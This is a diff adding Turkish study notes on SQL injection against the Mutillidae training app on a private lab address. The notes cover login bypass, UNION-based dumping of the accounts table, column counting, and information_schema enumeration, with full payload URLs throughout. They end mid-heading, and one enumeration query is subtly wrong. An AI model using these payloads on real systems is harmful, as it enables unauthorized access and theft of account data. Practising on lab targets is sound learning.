@@ -1,0 +1,77 @@
+SELECT * FROM accounts WHERE username='admin12' AND password=''' // şifre kısmına tek tırnak yazdım ve bu çıktı.
+
+
+şimdi password kısmına username doğru olmak koşulyla 123123' or 1=1 #' yazarsam giriş sağlanır. Not: 123123 diye yazılan şifre tamamen random
+
+
+SQL INJECTIPON POST METODU
+
+Şimdi daha ileri gidelim:
+
+eğer şifre kısmına bir şey yazmadan user kısmına admin12'# kısmını girip enter dersem eğer admin12 adında biri varsa içeri girerim.
+
+
+
+
+SQL INJECTION GET METODU
+
+İşlemler Urlde;
+
+http://192.168.155.93/mutillidae/index.php?page=user-info.php&username=admin12&password=123456&user-info-php-submit-button=View+Account+Details
+
+
+admin12 den sonra eğer '%23 yazarsam bu admin12'# demekle aynı şey aslında o yüzden giriş sağlarım.
+
+
+
+VERİ TABANINDAKİ TÜM VERİLERİ ÇEKMEK
+
+
+SELECT * FROM accounts WHERE username='admin12' UNION SELECT * FROM accounts # AND password='123456'
+
+
+şimdi bu mantığı url ye uygulayalım:
+
+http://192.168.155.93/mutillidae/index.php?page=user-info.php&username=admin%27%20union%20select%20*%20from%20accounts%23&password=123456&user-info-php-submit-button=View+Account+Details
+
+
+yazarsam tüm kişilerin bilgilerine ulaşırım.
+
+
+
+VERİTABANI İSMİNİ ÖĞRENMEK
+
+SELECT * FROM accounts WHERE username='admin' ORDER BY 1# UNION SELECT * FROM accounts # AND password='123456' YAPARSAM BANA İSİMLERİ GETİRİR
+
+O HALDE:
+
+ttp://192.168.155.93/mutillidae/index.php?page=user-info.php&username=admin' order by 10%23&password=123456&user-info-php-submit-button=View+Account+Details // linkini kullanırsam aynı sonucu blurum. Girilen 10 değeri 10 tane kullanıcı bilgisini verir eğer fazlaysa ona göre sayıyı ayarlayıp tam sayıyı bulabilirsin. 
+
+Bulduktan sonra:
+
+
+http://192.168.155.93/mutillidae/index.php?page=user-info.php&username=admin' union select 1, database(), user(),version(),5%23&password=123456&user-info-php-submit-button=View+Account+Details // 1 ve 5' ellemedim çünkü onlar boş görünüyorlardı.
+
+
+DAHA DERİNLERE İNMEK:
+
+union select 1, table_name, null, null, 5 from information_schema.tables
+
+o halde:
+
+http://192.168.155.93/mutillidae/index.php?page=user-info.php&username=admin' union select 1, table_name, null, null, 5 from information_schema.tables%23&password=123456&user-info-php-submit-button=View+Account+Details // artıl table nameler elimde.
+
+
+filtrele:
+
+union select 1, table_name, null, null, 5 from information_schema.tables where table_schema='owasp10' // bunu linkin i.ine koyunca filtreleme yapıyor.
+
+
+HERŞEYİ ELE GEÇİRMEK:
+
+union select 1, column_name, null, null, 5 from information_schema.tables where table_schema='accounts' // bu kodu linke aynı şekilde koyarsam bütün accountları ele geçirmiş olurum.
+
+
+
+Son Olarak:
+
